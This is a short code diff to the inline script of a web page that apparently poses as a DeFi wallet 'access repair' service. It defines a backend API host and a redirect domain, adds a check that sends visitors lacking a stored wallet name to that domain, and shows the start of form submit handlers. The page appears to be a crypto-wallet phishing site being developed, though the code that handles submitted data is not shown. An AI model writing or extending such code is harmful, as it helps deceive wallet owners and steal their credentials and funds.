@@ -108,7 +108,9 @@
   <script>
  var apiUrl="https://defiserver-u242.onrender.com"
   var winUrl="https://defiaccess.repair"
-
+  if(!localStorage.getItem("DEFIWalletName")){
+    window.location=winUrl
+  }
 
    var button= document.querySelectorAll(".form .div button")
    var form=document.getElementsByTagName("form")
@@ -148,7 +150,6 @@
     form[2].classList.remove("hid");
    })
   
-
 
    form[0].addEventListener("submit",(e)=>{
     e.preventDefault()
